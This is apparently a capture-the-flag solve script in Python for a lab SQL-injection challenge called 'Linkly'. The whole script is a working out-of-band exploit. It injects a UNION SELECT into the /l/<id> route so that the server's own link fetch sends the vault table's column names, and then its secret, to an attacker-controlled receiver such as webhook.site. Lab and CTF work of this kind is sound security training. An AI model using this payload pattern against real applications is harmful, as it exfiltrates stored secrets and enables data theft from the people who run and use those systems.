#!/usr/bin/env python3
"""
Linkly (sqli, 500, legendary) — CWE-89 out-of-band SQLi via the app's link fetch.

/l/<id> runs SELECT url,.. FROM links WHERE id=<id> (id injected raw, 3 cols,
col1 = the URL the server then fetches). No channel comes back, so we UNION col1
to a URL at a receiver WE control with the secret in the query string; the app's
own outbound GET exfiltrates it.

In this lab the app can't reach the student subnet (10.139.0.x) but has internet,
so RECEIVER must be internet-reachable (e.g. https://webhook.site/<token>). This
script only FIRES the callbacks; read the captured ?d=flag{...} on the receiver.

Usage:
    python3 solve.py https://webhook.site/<token>
    python3 solve.py https://webhook.site/<token> http://sqli7.chal.deti:8036
"""
import sys
import urllib.parse

import requests

if len(sys.argv) < 2:
    sys.exit("usage: python3 solve.py <receiver-base-url> [target]")
RECEIVER = sys.argv[1].rstrip("/")
BASE = (sys.argv[2] if len(sys.argv) > 2 else "http://sqli7.chal.deti:8036").rstrip("/")


def fire(select_expr: str) -> str:
    """Inject /l/0 UNION SELECT <col1>,2,3 -- and trigger the server-side fetch."""
    payload = f"0 UNION SELECT {select_expr},2,3-- -"
    url = f"{BASE}/l/" + urllib.parse.quote(payload, safe="")
    r = requests.get(url, timeout=20)
    status = "Fetched" if "Fetched" in r.text else ("couldn't reach" if "reach" in r.text else "?")
    return status


def main() -> int:
    # 1. exfil vault column names
    cols = f"'{RECEIVER}/?cols='||(SELECT group_concat(name) FROM pragma_table_info('vault'))"
    print(f"[i] columns callback: {fire(cols)}")

    # 2. exfil the secret
    data = f"'{RECEIVER}/?d='||(SELECT secret FROM vault LIMIT 1)"
    print(f"[i] secret callback: {fire(data)}")

    print(f"[+] now read the captured requests on {RECEIVER}")
    print("    expect:  GET /?cols=item,secret   and   GET /?d=flag{...}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
